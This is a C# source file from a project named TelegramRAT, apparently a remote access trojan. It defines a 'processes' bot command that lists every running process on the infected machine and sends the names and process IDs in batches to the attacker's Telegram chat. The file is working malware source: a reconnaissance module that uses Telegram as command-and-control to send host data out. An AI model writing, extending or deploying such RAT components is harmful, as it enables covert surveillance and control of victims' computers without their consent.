using Telegram.Bot;
using System.Text;
using System.Diagnostics;
using System.Net;
using Telegram.Bot.Types.Enums;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.System;

public class ProcessesCommand(ITelegramBotClient botClient, IBotNotificationService notificationService) : AbstractBotCommand
{
    public override string Command => "processes";
    public override string[] Aliases => new[] { "prcss" };
    public override string Description => "Get list of running processes.";
    public override int ArgsCount => 0;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            StringBuilder processesList = new StringBuilder();
            processesList.AppendLine("List of processes: ");
            int i = 1;
            Process[] processCollection = Process.GetProcesses();

            foreach (Process p in processCollection)
            {
                processesList.AppendLine($"<code>{WebUtility.HtmlEncode(p.ProcessName)}</code> : <code>{p.Id}</code>");
                if (i % 50 == 0)
                {
                    await botClient.SendMessage(
                        model.Message.Chat.Id,
                        processesList.ToString(),
                        parseMode: ParseMode.Html,
                        replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId }
                    );
                    processesList.Clear();
                }
                i++;
            }
            if (processesList.Length > 0)
            {
                await botClient.SendMessage(
                    model.Message.Chat.Id,
                    processesList.ToString(),
                    parseMode: ParseMode.Html,
                    replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId }
                );
            }
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
